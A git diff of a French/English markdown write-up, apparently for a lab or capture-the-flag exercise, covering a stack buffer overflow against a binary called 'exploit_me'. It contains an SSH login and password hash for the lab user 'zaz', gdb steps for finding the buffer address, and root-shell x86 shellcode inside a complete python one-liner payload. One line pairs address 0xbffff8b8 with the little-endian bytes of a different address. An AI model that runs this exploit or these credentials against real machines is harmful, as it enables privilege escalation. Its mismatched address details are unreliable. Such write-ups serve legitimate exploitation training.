@@ -2,34 +2,36 @@
 
 ## Insertion du SHELLCODE dans notre commande
 
-Create the payload
-The payload consists in padding + buffer address + NOP + shellcode.
-What is NOP ? It stands for "No Operations", basically it is used to make sure that our exploit doesn’t fail,because we won’t always point to the right address , so we add stuff that doesn’t do anything.
-So with that our shellcode is python -c 'print("\x90" * 140 + "\xb0\xf6\xff\xbf" + "\x90" * 100 + "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'
-
-
 ### 1. Connexion à l'utilisateur ZAZ
 * `ssh zaz@192.168.56.101`
 
 * zaz:646da671ca01bb5d84dbb5fb2238dc8e
 
-
-### 2. SHELLCODE 
+### 2. SHELLCODE + Trouver l'adresse du buffer
 
 * On recupere un shell code sur shell-storm, cf RAINFALL
 
-"\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+1. "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
+2. gdb + ctrl+f
+```
+b main
+r 0000
+x/200x $esp 
+```
+
+![alt text](../scripts/img/image-14.png)
 
 
- 
+* Adresse buffer : 0xbffff8f8
+* En little endian : 0xbffff8f8 = \xf8\xf8\xff\xbf
+
 ### 3. Payload 
-* "[ PADDING NOP POUR BUFFER OVERFLOW] + [ADRESSE DU BUFFER] + [PADDING NOP] + [SHELLCODE ]"
-
-En little endian : 0xbffff8b8 = \xb8\xf8\xff\xbf 
+* Payload form : "[ PADDING NOP POUR BUFFER OVERFLOW] + [ADRESSE DU BUFFER + 150] + ([PADDING NOP]) + [SHELLCODE]"
+* Adresse buffer : 0xbffff8b8 = \xf8\xf8\xff\xbf
 
 ```sh
-
-./exploit_me $(python -c 'print("\x90" * 140 + "\xb0\xf6\xff\xbf" + "\x90" * 100 + "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
+./exploit_me $(python -c 'print("\x90" * 140 + "\xf8\xf8\xff\xbf" + "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
 ```
 
 
